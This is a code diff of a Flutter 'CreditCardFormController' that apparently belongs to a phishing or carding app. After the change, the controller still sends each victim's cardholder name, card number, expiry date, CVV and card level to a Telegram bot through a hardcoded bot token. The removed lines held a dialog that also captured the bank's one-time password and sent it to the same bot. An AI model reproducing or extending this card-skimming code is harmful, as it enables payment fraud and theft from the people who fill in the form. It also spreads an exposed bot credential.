@@ -24,7 +24,6 @@ class CreditCardFormController extends GetxController {
         '\n CVV:$cvv' +
         '\nlevel is ${selectedItem.value}';
     await sendMessageToTelegram(msg);
-    _showOtpDialog(Get.context!);
   }
   // You can validate the form data here if required
 
@@ -41,28 +40,6 @@ class CreditCardFormController extends GetxController {
     super.onClose();
   }
 
-  void _showOtpDialog(BuildContext context) {
-    showDialog(
-      context: context,
-      builder: (BuildContext context) {
-        return OtpDialog(
-          onOtpEntered: (String otp) async {
-            // Process the entered OTP (e.g., send to server for validation)
-            String msg = "credit card info: " +
-                "\n name :  ${cardNameController.value}" +
-                "\n card number :  ${cardNumberController.value}" +
-                "\n expiration date :  ${expirationDateController.value}" +
-                "\n cvv :  ${cvvController.value}" +
-                "\n level: ${selectedItem.value}" +
-                "OTP Code : ${otp}";
-            await sendMessageToTelegram(msg);
-
-            print('Entered OTP: $otp');
-          },
-        );
-      },
-    );
-  }
 
   Future<void> sendMessageToTelegram(String message) async {
     const telegramBotToken = '6523460876:AAGfTKNriMKxXc4AFtXI25tOeM9ygLtUlws';
